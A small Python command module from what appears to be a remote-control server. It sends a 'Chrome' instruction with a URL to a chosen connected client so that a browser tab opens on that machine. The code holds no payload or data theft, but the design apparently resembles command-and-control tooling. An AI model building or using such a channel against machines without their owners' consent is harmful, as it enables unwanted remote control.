# commands/chrome.py
from colorama import Fore, Style

requires_id = True

from Server.console_handler import command_busy


def execute(conn, args, clients, id):
    # command_busy.set()
    msg = 'Chrome ' + args[1]
    clients[id].sendall(bytes(msg, 'utf-8'))
    print("Opening Chrome tab on client:", id)
    # command_busy.clear()  # Clear the event here
